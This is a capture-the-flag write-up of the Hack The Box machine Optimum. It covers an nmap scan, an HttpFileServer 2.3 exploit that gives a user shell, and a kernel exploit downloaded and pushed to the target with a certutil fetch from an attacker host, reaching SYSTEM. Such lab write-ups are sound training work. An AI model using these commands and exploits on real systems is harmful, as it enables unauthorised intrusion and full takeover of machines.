first enumeration with nmap

```
# Nmap 7.93 scan initiated Tue May 16 07:40:40 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 80 -Pn 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 16 07:40:54 2023 -- 1 IP address (1 host up) scanned in 13.53 seconds
```
we have only one port available.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/21e41466-787a-4458-86d9-ed95b681df11)

opening the IP on a browser we got directed to a service running `HttpFileServer 2.3`. let's check for exploit.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/28a1a4d4-19ac-45a2-ad77-8accebe1e70b)

found an exploit on exploitdb. [exploit](https://www.exploit-db.com/exploits/49584)

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/20f5dd6f-244e-440a-888c-ef692a3a7bbf)

make some changes in the exploit. let's run it.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e22327bd-2512-42b5-8465-bf6267fe3bdd)

ran the exploit and boom got shell as `optimum\kostas`


## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/defea30f-a6a1-40e1-a47c-c569341bd6c3)

checking systeminfo, we can see the OS version is `6.3.9600 N/A Build 9600`, let's check for exploit online.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c4fbc557-30c5-434a-af8f-9007073da1c4)

found an exploit on [exploitdb](https://www.exploit-db.com/exploits/41020).

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Optimum]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
--2023-05-16 20:33:32--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 560128 (547K) [application/octet-stream]
Saving to: ‘41020.exe’

41020.exe                                 100%[====================================================================================>] 547.00K  1.02MB/s    in 0.5s    

2023-05-16 20:33:33 (1.02 MB/s) - ‘41020.exe’ saved [560128/560128]
```
downloaded the exe binary file.

```
certutil -urlcache -f http://10.10.14.14/41020.exe 41020.exe
```
Send the binary exploit to the target.

```
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

23/05/2023  07:37     <DIR>          .
23/05/2023  07:37     <DIR>          ..
23/05/2023  07:31            560.128 41020.exe
23/05/2023  06:08              1.048 47558.py
18/03/2017  03:11            760.320 hfs.exe
23/05/2023  07:16             13.893 Invoke-MS16032.ps1
23/05/2023  07:14             11.461 privesc.ps1
23/05/2023  07:37             73.802 shell.exe
23/05/2023  12:53                 34 user.txt
23/05/2023  05:11                334 windowsprivchecker.bat
               8 File(s)      1.421.020 bytes
               2 Dir(s)   5.651.222.528 bytes free

C:\Users\kostas\Desktop>.\41020.exe
.\41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>
```
ran the exploit and boom got `nt authority\system`

